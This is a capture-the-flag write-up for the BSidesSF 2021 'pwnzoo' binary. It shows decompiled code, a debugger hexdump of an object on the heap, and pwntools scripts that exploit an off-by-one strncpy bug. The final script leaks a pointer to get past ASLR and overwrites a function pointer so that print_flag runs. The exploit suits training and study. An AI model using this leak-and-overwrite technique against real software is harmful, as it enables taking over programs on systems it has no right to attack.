---
title: BSidesSF 2021 Pwnzwoo 
updated: 2021-03-27 00:00
category: writeup
tags: pwn
author: h0n10
---

### Getting started

The pwnzoo binary is a unstripped 64bit ELF file

```bash
> file pwnzoo
pwnzoo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=031d178cb75ab5e94d9bba6da546a1a3d3f973b6, for GNU/Linux 3.2.0, with debug_info, not stripped
```

At first you have to decide if you want to play as a cat or dog and provide a name for the animal. Then a menu is presented where you can were you can speak, change the animals name are exit

```bash
> ./pwnzoo
Pwn Zoo!

Play as cat or dog? cat
New name: powerpuffpwn
Name changed!

Menu:
1. Speak
2. Change name
3. Exit
1
Meow! My name is powerpuffpwn!

Menu:
1. Speak
2. Change name
3. Exit
2
New name: new-name
Name changed!

Menu:
1. Speak
2. Change name
3. Exit
1
Meow! My name is new-name!

Menu:
1. Speak
2. Change name
3. Exit
3
```

### Analyzing the binary

I used BinaryNinja to analyze the binary. The following snippet shows the main function in High Level IL, which is close to C source code.
First the animal object gets constructed within construct_animal. The pointer that gets returned by this function is then passed to change_name and later to the menu.


![Main function](/assets/bsidessf-pwnzoo/main.png)

The "construct_animal" function first allocates 48 (0x30) bytes of memory, which is directly "zeroed" out. Then, a part of the allocated memory is filled with "0x20", followed by a null byte. 

```
0000131b  int32_t* rax = malloc(bytes: 0x30)
00001332  if (rax == 0)
00001324  {
00001332      puts(str: "Could not allocate!")
0000133c      exit(status: 1)
0000133c      noreturn
0000133c  }
00001352  memset(rax, 0, 0x30)
0000136c  memset(rax + 4, 0x20, 0x24)
00001375  *(rax + 0x27) = 0
00001385  int32_t* rax_11
```
We then are asked if we want to play as a cat or a dog. Depending on the provided answer, the binary sets the the first four bytes to 1 (cat) or 0 (dog). It also writes the function pointer of a "print_" function into the allocated memory. This pointer will later be called if we select the "Speak" entry invthe main menu.

```
00001385  while (true)
00001385  {
00001385      printf(format: "Play as cat or dog? ")
0000138f      read_stdin_tmpbuf()
0000139b      int32_t rax_8 = sx.d(*tmpbuf)
0000139e      if (rax_8 != 0x64)
0000139e      {
000013a3          if (rax_8 s> 0x64)
000013a3          {
000013a6              continue
000013a6          }
000013a8          else
000013a8          {
000013a8              if (rax_8 != 0x63 && rax_8 s> 0x63)
000013ad              {
000013b0                  continue
000013b0              }
                      // Play as cat
000013df              if (rax_8 == 0x63 || rax_8 == 0x43)
000013b2              {
000013df                  *rax = 1
000013f0                  *(rax + 0x28) = speak_cat
000013f4                  rax_11 = rax
000013f4                  break
000013f4              }
000013a8              if (rax_8 != 0x63 && rax_8 s<= 0x63 && rax_8 != 0x43 && rax_8 != 0x44)
000013b7              {
000013ba                  continue
000013ba              }
000013a8          }
000013a8      }
              // Play as dog
000013c0      *rax = 0
000013d1      *(rax + 0x28) = speak_dog
000013d5      rax_11 = rax
000013d9      break
000013d9  }
000013f9  return rax_11
```
So, the animal "object" has the following memory layout:

![animal memory layout](/assets/bsidessf-pwnzoo/memory.png)

You can have a look into an actual object by setting a breakpoint at the end of construct_animal and hexdump the pointer in RAX:

```
pwndbg> break *contruct_animal+230
pwndbg> r
...
pwndbg> hexdump $eax
+0000 0x555592a0
pwndbg> hexdump $rax
+0000 0x5555555592a0  01 00 00 00  20 20 20 20  20 20 20 20  20 20 20 20  │....│....│....│....│
+0010 0x5555555592b0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │....│....│....│....│
+0020 0x5555555592c0  20 20 20 20  20 20 20 00  10 52 55 55  55 55 00 00  │....│....│.RUU│UU..│
+0030 0x5555555592d0  00 00 00 00  00 00 00 00  11 04 00 00  00 00 00 00  │....│....│....│....│
```

If you have a look on the binary functions, you will notice that there is a "print_flag" function. So we don't need to inject shellcode, just successfully redirect the control flow to this function. 

change_name function

The change_name function receives the animal "object as parameter and sets the name within the object. Here the code (as BinaryNinjas HL IL):

```
00001412  printf(format: "New name: ")
0000141c  read_stdin_tmpbuf()
0000143b  *(strcspn(tmpbuf, data_20a8) + tmpbuf) = 0
00001446  uint64_t rax_3 = zx.q(*tmpbuf)
00001449  if (rax_3.b != 0)
00001449  {
00001473      strncpy(arg1 + 4, tmpbuf, strlen(arg1 + 4) + 1)
0000147f      rax_3 = puts(str: "Name changed!")
00001478  }
00001488  return rax_3

```
The "read_stdin_tmpbuf (not shown here) function uses fgets to read up to 128 bytes into tmpbuf variable. The change_name function then uses "strcspn" to identify the newline within that tmpbuf and uses this information to terminate the string by placing a \x00 byte at this localtion. Then, the string from tmpbuf gets copied into the "name" location of the animal object. 

If you look closely you can also identify the vulnerability: The length of the strncpy function is provided by strlen+1. This works fine for normal names. However, if we provide a name with 36 characters, we can overwrite the \x00 byte that was added by construct_anmimal. If we change the name a second time, we can also overwrite the pointer to the print_ function with a value that we control.

### Writing the exploit

Here the initial version of the exploit, which basically overwrites the pointers with eight "\x41" (A)s. The general idea is:

- On initializatzion, provide a 36 character long name, which will overwrite the "\x00" byte from animal_construct
- Change the name with a 44 character long name. This will overwrite the function pointer with our value
- Invoke the speak function from the menu. This will call the overwritten pointer.

```python
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwnzoo')
context.terminal = ['tmux', 'splitw', '-h']


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
tbreak main
tbreak construct_animal
continue
'''.format(**locals())

#io = remote('pwnzoo-7fb58ad8.challenges.bsidessf.net', 1234)
io = start()
io.recvuntil(b'dog?')
io.sendline(b'c')
io.recvuntil(b'New name: ')
io.sendline(cyclic(36))
io.recvuntil(b'Exit\n')
io.sendline(b'2')
io.sendline(cyclic(36) + "\x41\x41\x41\x41\x41\x41\x41\x41")
io.recvuntil(b'Exit\n')
io.sendline(b'1')
io.interactive()
```

We still have to deal with ASLR: The address of the print_flag function gets randomized on every start, therefore we can't just overwrite the pointer with a fixed value. At first I thought it is sufficient to overwrite just one byte of the pointer, but that did not work, due to the added "\x00" bytes. 

So wee need to modify the exploit workflow a bit:

- On initializatzion, provide a 36 character long name, which will overwrite the "\x00" byte from animal_construct
- Invoke the speak function form the menu. This will leak the current pointer value within the returned name
- Use the leaked pointer value to calculate the print_flag address
- Change the name of the animal, providing a 44 character long name (36 random characters + 8 bytes from the calulcated pointer)
- Invoke the speak function from the menu to call the overwritten pointer.

Here is the final exploit

```python
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwnzoo')
context.terminal = ['tmux', 'splitw', '-h']


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
tbreak main
tbreak construct_animal
continue
'''.format(**locals())

#io = remote('pwnzoo-7fb58ad8.challenges.bsidessf.net', 1234)
io = start()
io.recvuntil(b'dog?')
io.sendline(b'c')
io.recvuntil(b'New name: ')
io.sendline(cyclic(36))
io.recvuntil(b'Exit\n')
io.sendline(b'1')
leak = (int.from_bytes(io.recv().split()[4][36:-1], byteorder='little') & ~0xff)
log.info('Leaked address is' + str((hex(leak))))
io.sendline(b'2')
io.sendline(cyclic(36)+ p64(leak+0x3b))
io.recvuntil(b'Exit\n')
io.sendline(b'1')
io.interactive()

```

